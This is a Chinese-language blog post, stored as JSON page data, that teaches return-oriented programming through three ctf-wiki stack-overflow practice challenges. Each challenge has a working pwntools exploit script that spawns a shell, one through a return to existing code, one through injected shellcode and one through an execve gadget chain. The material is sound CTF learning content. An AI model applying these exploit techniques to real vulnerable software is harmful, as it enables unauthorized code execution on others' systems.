{"title":"ROP","uid":"4a7667facf84943d5e400f474fc547ee","slug":"ROP","date":"2021-06-05T10:23:30.000Z","updated":"2021-06-20T02:20:11.833Z","comments":true,"path":"api/articles/ROP.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/3ZBmwPkcIXjUE17.jpg","content":"<h1 id=\"ROP原理\"><a href=\"#ROP原理\" class=\"headerlink\" title=\"ROP原理\"></a>ROP原理</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>\n</ul>\n<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>\n<h1 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2text</a></h1><h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>控制程序执行程序本身已有的的代码 (.text)</p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>首先查看附件，32位可执行文件且只开了NX保护</p>\n<p><img src=\"https://i.loli.net/2021/06/06/TX1cHdubI45RlPp.png\" alt=\"image.png\"></p>\n<p>利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞<img src=\"https://i.loli.net/2021/06/06/i4CJDosGfOb1TEQ.png\" alt=\"image.png\"></p>\n<p>不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell<img src=\"https://i.loli.net/2021/06/06/Wsz8ARtm6n4LYIa.png\" alt=\"image.png\"></p>\n<p>接下来就是计算s的偏移量。设置断点0x08048641，进行调试</p>\n<p>可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4<img src=\"https://i.loli.net/2021/06/06/KFQVS5bCJfePYTs.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2text&#x27;</span>)</span><br><span class=\"line\">target = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(target))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ret2shellcode\"><a href=\"#ret2shellcode\" class=\"headerlink\" title=\"ret2shellcode\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode\">ret2shellcode</a></h1><h2 id=\"方法-1\"><a href=\"#方法-1\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>程序执行我们自己填充的shellcode代码</p>\n<h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现调用系统调用的字符，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，<img src=\"https://i.loli.net/2021/06/06/QbU3YlyvFrws2V8.png\" alt=\"image.png\"><img src=\"https://i.loli.net/2021/06/06/3lnkurmIjBxszJG.png\" alt=\"image.png\"></p>\n<p>先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址<img src=\"https://i.loli.net/2021/06/06/aVwCQ9mclOuWKdY.png\" alt=\"image.png\"></p>\n<p>在查看一下这个地址是否可执行。发现这个地址可读可写可执行。<img src=\"https://i.loli.net/2021/06/06/xFsyLRJPEoZ4YfS.png\" alt=\"image.png\"></p>\n<p>编写shellcode：<strong>shellcode = asm(shellcraft.sh())</strong></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804A080</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">112</span>, <span class=\"string\">&#x27;A&#x27;</span>) + p32(buf2)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a><a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2syscall</a></h1><h2 id=\"方法-2\"><a href=\"#方法-2\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>控制程序执行系统调用，获取 shell。</p>\n<h2 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>先查看附件</p>\n<p><img src=\"https://i.loli.net/2021/06/06/E548xu9R7JOXjph.png\" alt=\"image.png\"></p>\n<p>接下来利用 IDA 来查看源码<img src=\"https://i.loli.net/2021/06/06/Ih4PmFtxo63OgBn.png\" alt=\"image.png\"></p>\n<p>可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里<img src=\"https://i.loli.net/2021/06/06/mgMuoesVOpEzWXQ.png\" alt=\"image.png\"></p>\n<p>接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。<img src=\"https://i.loli.net/2021/06/06/qzpYFsk2cQNmg14.png\" alt=\"image.png\"></p>\n<p>此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（<a href=\"https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8\">系统调用基本知识</a>）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：</p>\n<ul>\n<li>系统调用号，即 eax 应该为 0xb</li>\n<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>\n<li>第二个参数，即 ecx 应该为 0</li>\n<li>第三个参数，即 edx 应该为 0</li>\n</ul>\n<p>为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（<a href=\"https://www.wangan.com/docs/678\">ROPgadget安装与使用方法</a>）<img src=\"https://i.loli.net/2021/06/06/lExnp75bSDTwsyi.png\" alt=\"image.png\"></p>\n<p>接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./rop&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax_ret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">pop_edx_ecx_ebx_ret = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">int_0x80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x80be408</span></span><br><span class=\"line\">payload = flat(</span><br><span class=\"line\">    [<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">112</span>, pop_eax_ret, <span class=\"number\">0xb</span>, pop_edx_ecx_ebx_ret, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bin_sh, int_0x80])</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>参考文章：<a href=\"https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall\">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall</a></p>\n","feature":true,"text":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadge...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"PWN","slug":"PWN","count":4,"path":"api/categories/PWN.json"}],"tags":[{"name":"积累","slug":"积累","count":2,"path":"api/tags/积累.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ROP%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">ROP原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2text\"><span class=\"toc-text\">ret2text</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2shellcode\"><span class=\"toc-text\">ret2shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-1\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2syscall\"><span class=\"toc-text\">ret2syscall</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-2\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Bugku pwn","uid":"144f81ea5594fe5e9363a228d67919cf","slug":"Bugku-PWN","date":"2021-07-03T14:10:52.000Z","updated":"2021-07-03T14:46:12.563Z","comments":true,"path":"api/articles/Bugku-PWN.json","keywords":null,"cover":[],"text":"Canary看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护 查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间 查看字符串，发现存在bin/sh，在函数表里面也存在system函数...","link":"","photos":[],"count_time":{"symbolsCount":"1k","symbolsTime":"1 mins."},"categories":[{"name":"PWN","slug":"PWN","count":4,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"BUU MISC刷题记录","uid":"8178986268830468ddd9f4a48060d9de","slug":"BUU-MISC刷题记录","date":"2021-05-31T00:48:04.000Z","updated":"2021-06-06T02:54:25.341Z","comments":true,"path":"api/articles/BUU-MISC刷题记录.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/eXnPUrYdWb3qpIN.jpg","text":"金三胖下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag 二维码在线扫码，得到secret is here 用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件 利用binwalk...","link":"","photos":[],"count_time":{"symbolsCount":980,"symbolsTime":"1 mins."},"categories":[{"name":"MISC","slug":"MISC","count":4,"path":"api/categories/MISC.json"}],"tags":[{"name":"write up","slug":"write-up","count":2,"path":"api/tags/write-up.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}